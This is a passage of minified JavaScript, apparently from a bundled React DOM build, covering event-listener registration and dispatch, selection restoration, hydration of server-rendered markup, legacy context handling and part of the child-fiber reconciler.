var hd = !1;
if (St) {
    var ns;
    if (St) {
        var rs = "oninput" in document;
        if (!rs) {
            var Ju = document.createElement("div");
            Ju.setAttribute("oninput", "return;"), rs = typeof Ju.oninput == "function"
        }
        ns = rs
    } else ns = !1;
    hd = ns && (!document.documentMode || 9 < document.documentMode)
}

function ea() {
    _r && (_r.detachEvent("onpropertychange", md), $r = _r = null)
}

function md(e) {
    if (e.propertyName === "value" && Ci($r)) {
        var t = [];
        pd(t, $r, e, Dl(e)), Gc(km, t)
    }
}

function Cm(e, t, n) {
    e === "focusin" ? (ea(), _r = t, $r = n, _r.attachEvent("onpropertychange", md)) : e === "focusout" && ea()
}

function Pm(e) {
    if (e === "selectionchange" || e === "keyup" || e === "keydown") return Ci($r)
}

function Nm(e, t) {
    if (e === "click") return Ci(t)
}

function Tm(e, t) {
    if (e === "input" || e === "change") return Ci(t)
}

function _m(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var nt = typeof Object.is == "function" ? Object.is : _m;

function Vr(e, t) {
    if (nt(e, t)) return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var o = n[r];
        if (!Ns.call(t, o) || !nt(e[o], t[o])) return !1
    }
    return !0
}

function ta(e) {
    for (; e && e.firstChild;) e = e.firstChild;
    return e
}

function na(e, t) {
    var n = ta(e);
    e = 0;
    for (var r; n;) {
        if (n.nodeType === 3) {
            if (r = e + n.textContent.length, e <= t && r >= t) return {
                node: n,
                offset: t - e
            };
            e = r
        }
        e: {
            for (; n;) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = ta(n)
    }
}

function yd(e, t) {
    return e && t ? e === t ? !0 : e && e.nodeType === 3 ? !1 : t && t.nodeType === 3 ? yd(e, t.parentNode) : "contains" in e ? e.contains(t) : e.compareDocumentPosition ? !!(e.compareDocumentPosition(t) & 16) : !1 : !1
}

function vd() {
    for (var e = window, t = Ho(); t instanceof e.HTMLIFrameElement;) {
        try {
            var n = typeof t.contentWindow.location.href == "string"
        } catch {
            n = !1
        }
        if (n) e = t.contentWindow;
        else break;
        t = Ho(e.document)
    }
    return t
}

function Bl(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && (t === "input" && (e.type === "text" || e.type === "search" || e.type === "tel" || e.type === "url" || e.type === "password") || t === "textarea" || e.contentEditable === "true")
}

function Rm(e) {
    var t = vd(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && yd(n.ownerDocument.documentElement, n)) {
        if (r !== null && Bl(n)) {
            if (t = r.start, e = r.end, e === void 0 && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
            else if (e = (t = n.ownerDocument || document) && t.defaultView || window, e.getSelection) {
                e = e.getSelection();
                var o = n.textContent.length,
                    i = Math.min(r.start, o);
                r = r.end === void 0 ? i : Math.min(r.end, o), !e.extend && i > r && (o = r, r = i, i = o), o = na(n, i);
                var s = na(n, r);
                o && s && (e.rangeCount !== 1 || e.anchorNode !== o.node || e.anchorOffset !== o.offset || e.focusNode !== s.node || e.focusOffset !== s.offset) && (t = t.createRange(), t.setStart(o.node, o.offset), e.removeAllRanges(), i > r ? (e.addRange(t), e.extend(s.node, s.offset)) : (t.setEnd(s.node, s.offset), e.addRange(t)))
            }
        }
        for (t = [], e = n; e = e.parentNode;) e.nodeType === 1 && t.push({
            element: e,
            left: e.scrollLeft,
            top: e.scrollTop
        });
        for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++) e = t[n], e.element.scrollLeft = e.left, e.element.scrollTop = e.top
    }
}
var jm = St && "documentMode" in document && 11 >= document.documentMode,
    _n = null,
    Qs = null,
    Rr = null,
    Hs = !1;

function ra(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    Hs || _n == null || _n !== Ho(r) || (r = _n, "selectionStart" in r && Bl(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection(), r = {
        anchorNode: r.anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }), Rr && Vr(Rr, r) || (Rr = r, r = Jo(Qs, "onSelect"), 0 < r.length && (t = new $l("onSelect", "select", null, t, n), e.push({
        event: t,
        listeners: r
    }), t.target = _n)))
}

function wo(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
}
var Rn = {
        animationend: wo("Animation", "AnimationEnd"),
        animationiteration: wo("Animation", "AnimationIteration"),
        animationstart: wo("Animation", "AnimationStart"),
        transitionend: wo("Transition", "TransitionEnd")
    },
    os = {},
    gd = {};
St && (gd = document.createElement("div").style, "AnimationEvent" in window || (delete Rn.animationend.animation, delete Rn.animationiteration.animation, delete Rn.animationstart.animation), "TransitionEvent" in window || delete Rn.transitionend.transition);

function Pi(e) {
    if (os[e]) return os[e];
    if (!Rn[e]) return e;
    var t = Rn[e],
        n;
    for (n in t)
        if (t.hasOwnProperty(n) && n in gd) return os[e] = t[n];
    return e
}
var wd = Pi("animationend"),
    xd = Pi("animationiteration"),
    Sd = Pi("animationstart"),
    kd = Pi("transitionend"),
    Ed = new Map,
    oa = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

function en(e, t) {
    Ed.set(e, t), kn(t, [e])
}
for (var is = 0; is < oa.length; is++) {
    var ss = oa[is],
        Om = ss.toLowerCase(),
        Lm = ss[0].toUpperCase() + ss.slice(1);
    en(Om, "on" + Lm)
}
en(wd, "onAnimationEnd");
en(xd, "onAnimationIteration");
en(Sd, "onAnimationStart");
en("dblclick", "onDoubleClick");
en("focusin", "onFocus");
en("focusout", "onBlur");
en(kd, "onTransitionEnd");
Jn("onMouseEnter", ["mouseout", "mouseover"]);
Jn("onMouseLeave", ["mouseout", "mouseover"]);
Jn("onPointerEnter", ["pointerout", "pointerover"]);
Jn("onPointerLeave", ["pointerout", "pointerover"]);
kn("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
kn("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
kn("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
kn("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
kn("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
kn("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var Cr = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
    Mm = new Set("cancel close invalid load scroll toggle".split(" ").concat(Cr));

function ia(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n, Oh(r, t, void 0, e), e.currentTarget = null
}

function Cd(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            o = r.event;
        r = r.listeners;
        e: {
            var i = void 0;
            if (t)
                for (var s = r.length - 1; 0 <= s; s--) {
                    var l = r[s],
                        u = l.instance,
                        a = l.currentTarget;
                    if (l = l.listener, u !== i && o.isPropagationStopped()) break e;
                    ia(o, l, a), i = u
                } else
                    for (s = 0; s < r.length; s++) {
                        if (l = r[s], u = l.instance, a = l.currentTarget, l = l.listener, u !== i && o.isPropagationStopped()) break e;
                        ia(o, l, a), i = u
                    }
        }
    }
    if (Go) throw e = $s, Go = !1, $s = null, e
}

function H(e, t) {
    var n = t[Xs];
    n === void 0 && (n = t[Xs] = new Set);
    var r = e + "__bubble";
    n.has(r) || (Pd(t, e, 2, !1), n.add(r))
}

function ls(e, t, n) {
    var r = 0;
    t && (r |= 4), Pd(n, e, r, t)
}
var xo = "_reactListening" + Math.random().toString(36).slice(2);

function Wr(e) {
    if (!e[xo]) {
        e[xo] = !0, Lc.forEach(function(n) {
            n !== "selectionchange" && (Mm.has(n) || ls(n, !1, e), ls(n, !0, e))
        });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[xo] || (t[xo] = !0, ls("selectionchange", !1, t))
    }
}

function Pd(e, t, n, r) {
    switch (ud(t)) {
        case 1:
            var o = Kh;
            break;
        case 4:
            o = Gh;
            break;
        default:
            o = bl
    }
    n = o.bind(null, t, n, e), o = void 0, !Us || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (o = !0), r ? o !== void 0 ? e.addEventListener(t, n, {
        capture: !0,
        passive: o
    }) : e.addEventListener(t, n, !0) : o !== void 0 ? e.addEventListener(t, n, {
        passive: o
    }) : e.addEventListener(t, n, !1)
}

function us(e, t, n, r, o) {
    var i = r;
    if (!(t & 1) && !(t & 2) && r !== null) e: for (;;) {
        if (r === null) return;
        var s = r.tag;
        if (s === 3 || s === 4) {
            var l = r.stateNode.containerInfo;
            if (l === o || l.nodeType === 8 && l.parentNode === o) break;
            if (s === 4)
                for (s = r.return; s !== null;) {
                    var u = s.tag;
                    if ((u === 3 || u === 4) && (u = s.stateNode.containerInfo, u === o || u.nodeType === 8 && u.parentNode === o)) return;
                    s = s.return
                }
            for (; l !== null;) {
                if (s = ln(l), s === null) return;
                if (u = s.tag, u === 5 || u === 6) {
                    r = i = s;
                    continue e
                }
                l = l.parentNode
            }
        }
        r = r.return
    }
    Gc(function() {
        var a = i,
            p = Dl(n),
            m = [];
        e: {
            var h = Ed.get(e);
            if (h !== void 0) {
                var w = $l,
                    k = e;
                switch (e) {
                    case "keypress":
                        if (Fo(n) === 0) break e;
                    case "keydown":
                    case "keyup":
                        w = am;
                        break;
                    case "focusin":
                        k = "focus", w = ts;
                        break;
                    case "focusout":
                        k = "blur", w = ts;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        w = ts;
                        break;
                    case "click":
                        if (n.button === 2) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        w = Ku;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        w = Xh;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        w = fm;
                        break;
                    case wd:
                    case xd:
                    case Sd:
                        w = em;
                        break;
                    case kd:
                        w = hm;
                        break;
                    case "scroll":
                        w = qh;
                        break;
                    case "wheel":
                        w = ym;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        w = nm;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        w = qu
                }
                var v = (t & 4) !== 0,
                    S = !v && e === "scroll",
                    d = v ? h !== null ? h + "Capture" : null : h;
                v = [];
                for (var c = a, f; c !== null;) {
                    f = c;
                    var x = f.stateNode;
                    if (f.tag === 5 && x !== null && (f = x, d !== null && (x = Ar(c, d), x != null && v.push(Br(c, x, f)))), S) break;
                    c = c.return
                }
                0 < v.length && (h = new w(h, k, null, n, p), m.push({
                    event: h,
                    listeners: v
                }))
            }
        }
        if (!(t & 7)) {
            e: {
                if (h = e === "mouseover" || e === "pointerover", w = e === "mouseout" || e === "pointerout", h && n !== zs && (k = n.relatedTarget || n.fromElement) && (ln(k) || k[kt])) break e;
                if ((w || h) && (h = p.window === p ? p : (h = p.ownerDocument) ? h.defaultView || h.parentWindow : window, w ? (k = n.relatedTarget || n.toElement, w = a, k = k ? ln(k) : null, k !== null && (S = En(k), k !== S || k.tag !== 5 && k.tag !== 6) && (k = null)) : (w = null, k = a), w !== k)) {
                    if (v = Ku, x = "onMouseLeave", d = "onMouseEnter", c = "mouse", (e === "pointerout" || e === "pointerover") && (v = qu, x = "onPointerLeave", d = "onPointerEnter", c = "pointer"), S = w == null ? h : jn(w), f = k == null ? h : jn(k), h = new v(x, c + "leave", w, n, p), h.target = S, h.relatedTarget = f, x = null, ln(p) === a && (v = new v(d, c + "enter", k, n, p), v.target = f, v.relatedTarget = S, x = v), S = x, w && k) t: {
                        for (v = w, d = k, c = 0, f = v; f; f = Cn(f)) c++;
                        for (f = 0, x = d; x; x = Cn(x)) f++;
                        for (; 0 < c - f;) v = Cn(v),
                        c--;
                        for (; 0 < f - c;) d = Cn(d),
                        f--;
                        for (; c--;) {
                            if (v === d || d !== null && v === d.alternate) break t;
                            v = Cn(v), d = Cn(d)
                        }
                        v = null
                    }
                    else v = null;
                    w !== null && sa(m, h, w, v, !1), k !== null && S !== null && sa(m, S, k, v, !0)
                }
            }
            e: {
                if (h = a ? jn(a) : window, w = h.nodeName && h.nodeName.toLowerCase(), w === "select" || w === "input" && h.type === "file") var C = Em;
                else if (Zu(h))
                    if (hd) C = Tm;
                    else {
                        C = Pm;
                        var P = Cm
                    }
                else(w = h.nodeName) && w.toLowerCase() === "input" && (h.type === "checkbox" || h.type === "radio") && (C = Nm);
                if (C && (C = C(e, a))) {
                    pd(m, C, n, p);
                    break e
                }
                P && P(e, h, a),
                e === "focusout" && (P = h._wrapperState) && P.controlled && h.type === "number" && Ms(h, "number", h.value)
            }
            switch (P = a ? jn(a) : window, e) {
                case "focusin":
                    (Zu(P) || P.contentEditable === "true") && (_n = P, Qs = a, Rr = null);
                    break;
                case "focusout":
                    Rr = Qs = _n = null;
                    break;
                case "mousedown":
                    Hs = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Hs = !1, ra(m, n, p);
                    break;
                case "selectionchange":
                    if (jm) break;
                case "keydown":
                case "keyup":
                    ra(m, n, p)
            }
            var N;
            if (Wl) e: {
                switch (e) {
                    case "compositionstart":
                        var _ = "onCompositionStart";
                        break e;
                    case "compositionend":
                        _ = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        _ = "onCompositionUpdate";
                        break e
                }
                _ = void 0
            }
            else Tn ? dd(e, n) && (_ = "onCompositionEnd") : e === "keydown" && n.keyCode === 229 && (_ = "onCompositionStart");_ && (cd && n.locale !== "ko" && (Tn || _ !== "onCompositionStart" ? _ === "onCompositionEnd" && Tn && (N = ad()) : (Vt = p, Ul = "value" in Vt ? Vt.value : Vt.textContent, Tn = !0)), P = Jo(a, _), 0 < P.length && (_ = new Gu(_, e, null, n, p), m.push({
                event: _,
                listeners: P
            }), N ? _.data = N : (N = fd(n), N !== null && (_.data = N)))),
            (N = gm ? wm(e, n) : xm(e, n)) && (a = Jo(a, "onBeforeInput"), 0 < a.length && (p = new Gu("onBeforeInput", "beforeinput", null, n, p), m.push({
                event: p,
                listeners: a
            }), p.data = N))
        }
        Cd(m, t)
    })
}

function Br(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}

function Jo(e, t) {
    for (var n = t + "Capture", r = []; e !== null;) {
        var o = e,
            i = o.stateNode;
        o.tag === 5 && i !== null && (o = i, i = Ar(e, n), i != null && r.unshift(Br(e, i, o)), i = Ar(e, t), i != null && r.push(Br(e, i, o))), e = e.return
    }
    return r
}

function Cn(e) {
    if (e === null) return null;
    do e = e.return; while (e && e.tag !== 5);
    return e || null
}

function sa(e, t, n, r, o) {
    for (var i = t._reactName, s = []; n !== null && n !== r;) {
        var l = n,
            u = l.alternate,
            a = l.stateNode;
        if (u !== null && u === r) break;
        l.tag === 5 && a !== null && (l = a, o ? (u = Ar(n, i), u != null && s.unshift(Br(n, u, l))) : o || (u = Ar(n, i), u != null && s.push(Br(n, u, l)))), n = n.return
    }
    s.length !== 0 && e.push({
        event: t,
        listeners: s
    })
}
var Im = /\r\n?/g,
    Dm = /\u0000|\uFFFD/g;

function la(e) {
    return (typeof e == "string" ? e : "" + e).replace(Im, `
`).replace(Dm, "")
}

function So(e, t, n) {
    if (t = la(t), la(e) !== t && n) throw Error(T(425))
}

function ei() {}
var Ks = null,
    Gs = null;

function qs(e, t) {
    return e === "textarea" || e === "noscript" || typeof t.children == "string" || typeof t.children == "number" || typeof t.dangerouslySetInnerHTML == "object" && t.dangerouslySetInnerHTML !== null && t.dangerouslySetInnerHTML.__html != null
}
var Ys = typeof setTimeout == "function" ? setTimeout : void 0,
    Fm = typeof clearTimeout == "function" ? clearTimeout : void 0,
    ua = typeof Promise == "function" ? Promise : void 0,
    Am = typeof queueMicrotask == "function" ? queueMicrotask : typeof ua < "u" ? function(e) {
        return ua.resolve(null).then(e).catch(zm)
    } : Ys;

function zm(e) {
    setTimeout(function() {
        throw e
    })
}

function as(e, t) {
    var n = t,
        r = 0;
    do {
        var o = n.nextSibling;
        if (e.removeChild(n), o && o.nodeType === 8)
            if (n = o.data, n === "/$") {
                if (r === 0) {
                    e.removeChild(o), Ur(t);
                    return
                }
                r--
            } else n !== "$" && n !== "$?" && n !== "$!" || r++;
        n = o
    } while (n);
    Ur(t)
}

function Kt(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3) break;
        if (t === 8) {
            if (t = e.data, t === "$" || t === "$!" || t === "$?") break;
            if (t === "/$") return null
        }
    }
    return e
}

function aa(e) {
    e = e.previousSibling;
    for (var t = 0; e;) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0) return e;
                t--
            } else n === "/$" && t++
        }
        e = e.previousSibling
    }
    return null
}
var ar = Math.random().toString(36).slice(2),
    ct = "__reactFiber$" + ar,
    Qr = "__reactProps$" + ar,
    kt = "__reactContainer$" + ar,
    Xs = "__reactEvents$" + ar,
    bm = "__reactListeners$" + ar,
    Um = "__reactHandles$" + ar;

function ln(e) {
    var t = e[ct];
    if (t) return t;
    for (var n = e.parentNode; n;) {
        if (t = n[kt] || n[ct]) {
            if (n = t.alternate, t.child !== null || n !== null && n.child !== null)
                for (e = aa(e); e !== null;) {
                    if (n = e[ct]) return n;
                    e = aa(e)
                }
            return t
        }
        e = n, n = e.parentNode
    }
    return null
}

function so(e) {
    return e = e[ct] || e[kt], !e || e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3 ? null : e
}

function jn(e) {
    if (e.tag === 5 || e.tag === 6) return e.stateNode;
    throw Error(T(33))
}

function Ni(e) {
    return e[Qr] || null
}
var Zs = [],
    On = -1;

function tn(e) {
    return {
        current: e
    }
}

function K(e) {
    0 > On || (e.current = Zs[On], Zs[On] = null, On--)
}

function B(e, t) {
    On++, Zs[On] = e.current, e.current = t
}
var Jt = {},
    ge = tn(Jt),
    _e = tn(!1),
    yn = Jt;

function er(e, t) {
    var n = e.type.contextTypes;
    if (!n) return Jt;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var o = {},
        i;
    for (i in n) o[i] = t[i];
    return r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = o), o
}

function Re(e) {
    return e = e.childContextTypes, e != null
}

function ti() {
    K(_e), K(ge)
}

function ca(e, t, n) {
    if (ge.current !== Jt) throw Error(T(168));
    B(ge, t), B(_e, n)
}

function Nd(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes, typeof r.getChildContext != "function") return n;
    r = r.getChildContext();
    for (var o in r)
        if (!(o in t)) throw Error(T(108, Ch(e) || "Unknown", o));
    return X({}, n, r)
}

function ni(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || Jt, yn = ge.current, B(ge, e), B(_e, _e.current), !0
}

function da(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(T(169));
    n ? (e = Nd(e, t, yn), r.__reactInternalMemoizedMergedChildContext = e, K(_e), K(ge), B(ge, e)) : K(_e), B(_e, n)
}
var vt = null,
    Ti = !1,
    cs = !1;

function Td(e) {
    vt === null ? vt = [e] : vt.push(e)
}

function $m(e) {
    Ti = !0, Td(e)
}

function nn() {
    if (!cs && vt !== null) {
        cs = !0;
        var e = 0,
            t = W;
        try {
            var n = vt;
            for (W = 1; e < n.length; e++) {
                var r = n[e];
                do r = r(!0); while (r !== null)
            }
            vt = null, Ti = !1
        } catch (o) {
            throw vt !== null && (vt = vt.slice(e + 1)), Zc(Fl, nn), o
        } finally {
            W = t, cs = !1
        }
    }
    return null
}
var Ln = [],
    Mn = 0,
    ri = null,
    oi = 0,
    Ve = [],
    We = 0,
    vn = null,
    gt = 1,
    wt = "";

function on(e, t) {
    Ln[Mn++] = oi, Ln[Mn++] = ri, ri = e, oi = t
}

function _d(e, t, n) {
    Ve[We++] = gt, Ve[We++] = wt, Ve[We++] = vn, vn = e;
    var r = gt;
    e = wt;
    var o = 32 - et(r) - 1;
    r &= ~(1 << o), n += 1;
    var i = 32 - et(t) + o;
    if (30 < i) {
        var s = o - o % 5;
        i = (r & (1 << s) - 1).toString(32), r >>= s, o -= s, gt = 1 << 32 - et(t) + o | n << o | r, wt = i + e
    } else gt = 1 << i | n << o | r, wt = e
}

function Ql(e) {
    e.return !== null && (on(e, 1), _d(e, 1, 0))
}

function Hl(e) {
    for (; e === ri;) ri = Ln[--Mn], Ln[Mn] = null, oi = Ln[--Mn], Ln[Mn] = null;
    for (; e === vn;) vn = Ve[--We], Ve[We] = null, wt = Ve[--We], Ve[We] = null, gt = Ve[--We], Ve[We] = null
}
var Fe = null,
    De = null,
    G = !1,
    Je = null;

function Rd(e, t) {
    var n = Be(5, null, null, 0);
    n.elementType = "DELETED", n.stateNode = t, n.return = e, t = e.deletions, t === null ? (e.deletions = [n], e.flags |= 16) : t.push(n)
}

function fa(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t, t !== null ? (e.stateNode = t, Fe = e, De = Kt(t.firstChild), !0) : !1;
        case 6:
            return t = e.pendingProps === "" || t.nodeType !== 3 ? null : t, t !== null ? (e.stateNode = t, Fe = e, De = null, !0) : !1;
        case 13:
            return t = t.nodeType !== 8 ? null : t, t !== null ? (n = vn !== null ? {
                id: gt,
                overflow: wt
            } : null, e.memoizedState = {
                dehydrated: t,
                treeContext: n,
                retryLane: 1073741824
            }, n = Be(18, null, null, 0), n.stateNode = t, n.return = e, e.child = n, Fe = e, De = null, !0) : !1;
        default:
            return !1
    }
}

function Js(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0
}

function el(e) {
    if (G) {
        var t = De;
        if (t) {
            var n = t;
            if (!fa(e, t)) {
                if (Js(e)) throw Error(T(418));
                t = Kt(n.nextSibling);
                var r = Fe;
                t && fa(e, t) ? Rd(r, n) : (e.flags = e.flags & -4097 | 2, G = !1, Fe = e)
            }
        } else {
            if (Js(e)) throw Error(T(418));
            e.flags = e.flags & -4097 | 2, G = !1, Fe = e
        }
    }
}

function pa(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13;) e = e.return;
    Fe = e
}

function ko(e) {
    if (e !== Fe) return !1;
    if (!G) return pa(e), G = !0, !1;
    var t;
    if ((t = e.tag !== 3) && !(t = e.tag !== 5) && (t = e.type, t = t !== "head" && t !== "body" && !qs(e.type, e.memoizedProps)), t && (t = De)) {
        if (Js(e)) throw jd(), Error(T(418));
        for (; t;) Rd(e, t), t = Kt(t.nextSibling)
    }
    if (pa(e), e.tag === 13) {
        if (e = e.memoizedState, e = e !== null ? e.dehydrated : null, !e) throw Error(T(317));
        e: {
            for (e = e.nextSibling, t = 0; e;) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            De = Kt(e.nextSibling);
                            break e
                        }
                        t--
                    } else n !== "$" && n !== "$!" && n !== "$?" || t++
                }
                e = e.nextSibling
            }
            De = null
        }
    } else De = Fe ? Kt(e.stateNode.nextSibling) : null;
    return !0
}

function jd() {
    for (var e = De; e;) e = Kt(e.nextSibling)
}

function tr() {
    De = Fe = null, G = !1
}

function Kl(e) {
    Je === null ? Je = [e] : Je.push(e)
}
var Vm = Nt.ReactCurrentBatchConfig;

function yr(e, t, n) {
    if (e = n.ref, e !== null && typeof e != "function" && typeof e != "object") {
        if (n._owner) {
            if (n = n._owner, n) {
                if (n.tag !== 1) throw Error(T(309));
                var r = n.stateNode
            }
            if (!r) throw Error(T(147, e));
            var o = r,
                i = "" + e;
            return t !== null && t.ref !== null && typeof t.ref == "function" && t.ref._stringRef === i ? t.ref : (t = function(s) {
                var l = o.refs;
                s === null ? delete l[i] : l[i] = s
            }, t._stringRef = i, t)
        }
        if (typeof e != "string") throw Error(T(284));
        if (!n._owner) throw Error(T(290, e))
    }
    return e
}

function Eo(e, t) {
    throw e = Object.prototype.toString.call(t), Error(T(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e))
}

function ha(e) {
    var t = e._init;
    return t(e._payload)
}

function Od(e) {
    function t(d, c) {
        if (e) {
            var f = d.deletions;
            f === null ? (d.deletions = [c], d.flags |= 16) : f.push(c)
        }
    }

    function n(d, c) {
        if (!e) return null;
        for (; c !== null;) t(d, c), c = c.sibling;
        return null
    }

    function r(d, c) {
        for (d = new Map; c !== null;) c.key !== null ? d.set(c.key, c) : d.set(c.index, c), c = c.sibling;
        return d
    }

    function o(d, c) {
        return d = Xt(d, c), d.index = 0, d.sibling = null, d
    }

    function i(d, c, f) {
        return d.index = f, e ? (f = d.alternate, f !== null ? (f = f.index, f < c ? (d.flags |= 2, c) : f) : (d.flags |= 2, c)) : (d.flags |= 1048576, c)
    }

    function s(d) {
        return e && d.alternate === null && (d.flags |= 2), d
    }

    function l(d, c, f, x) {
        return c === null || c.tag !== 6 ? (c = vs(f, d.mode, x), c.return = d, c) : (c = o(c, f), c.return = d, c)
    }

    function u(d, c, f, x) {
        var C = f.type;
        return C === Nn ? p(d, c, f.props.children, x, f.key) : c !== null && (c.elementType === C || typeof C == "object" && C !== null && C.$$typeof === Mt && ha(C) === c.type) ? (x = o(c, f.props), x.ref = yr(d, c, f), x.return = d, x) : (x = Wo(f.type, f.key, f.props, null, d.mode, x), x.ref = yr(d, c, f), x.return = d, x)
    }

    function a(d, c, f, x) {
        return c === null || c.tag !== 4 || c.stateNode.containerInfo !== f.containerInfo || c.stateNode.implementation !== f.implementation ? (c = gs(f, d.mode, x), c.return = d, c) : (c = o(c, f.children || []), c.return = d, c)
    }

    function p(d, c, f, x, C) {
        return c === null || c.tag !== 7 ? (c = mn(f, d.mode, x, C), c.return = d, c) : (c = o(c, f), c.return = d, c)
    }

    function m(d, c, f) {
        if (typeof c == "string" && c !== "" || typeof c == "number") return c = vs("" + c, d.mode, f), c.return = d, c;
        if (typeof c == "object" && c !== null) {
            switch (c.$$typeof) {
                case fo:
                    return f = Wo(c.type, c.key, c.props, null, d.mode, f), f.ref = yr(d, null, c), f.return = d, f;
                case Pn:
                    return c = gs(c, d.mode, f), c.return = d, c;
                case Mt:
                    var x = c._init;
                    return m(d, x(c._payload), f)
            }
            if (kr(c) || dr(c)) return c = mn(c, d.mode, f, null), c.return = d, c;
            Eo(d, c)
        }
        return null
    }

    function h(d, c, f, x) {
        var C = c !== null ? c.key : null;
        if (typeof f == "string" && f !== "" || typeof f == "number") return C !== null ? null : l(d, c, "" + f, x);
        if (typeof f == "object" && f !== null) {
            switch (f.$$typeof) {
                case fo:
                    return f.key === C ? u(d, c, f, x) : null;
                case Pn:
                    return f.key === C ? a(d, c, f, x) : null;
                case Mt:
                    return C = f._init, h(d, c, C(f._payload), x)
            }
            if (kr(f) || dr(f)) return C !== null ? null : p(d, c, f, x, null);
            Eo(d, f)
        }
        return null
    }

    function w(d, c, f, x, C) {
        if (typeof x == "string" && x !== "" || typeof x == "number") return d = d.get(f) || null, l(c, d, "" + x, C);
        if (typeof x == "object" && x !== null) {
            switch (x.$$typeof) {
                case fo:
                    return d = d.get(x.key === null ? f : x.key) || null, u(c, d, x, C);
                case Pn:
                    return d = d.get(x.key === null ? f : x.key) || null, a(c, d, x, C);
                case Mt:
                    var P = x._init;
                    return w(d, c, f, P(x._payload), C)
            }
            if (kr(x) || dr(x)) return d = d.get(f) || null, p(c, d, x, C, null);
            Eo(c, x)
        }
        return null
    }

    function k(d, c, f, x) {
        for (var C = null, P = null, N = c, _ = c = 0, M = null; N !== null && _ < f.length; _++) {
            N.index > _ ? (M = N, N = null) : M = N.sibling;
            var L = h(d, N, f[_], x);
            if (L === null) {
                N === null && (N = M);
                break
            }
            e && N && L.alternate === null && t(d, N), c = i(L, c, _), P === null ? C = L : P.sibling = L, P = L, N = M
        }
        if (_ === f.length) return n(d, N), G && on(d, _), C;
        if (N === null) {
            for (; _ < f.length; _++) N = m(d, f[_], x), N !== null && (c = i(N, c, _), P === null ? C = N : P.sibling = N, P = N);
            return G && on(d, _), C
        }
        for (N = r(d, N); _ < f.length; _++) M = w(N, d, _, f[_], x), M !== null && (e && M.alternate !== null && N.delete(M.key === null ? _ : M.key), c = i(M, c, _), P === null ? C = M : P.sibling = M, P = M);
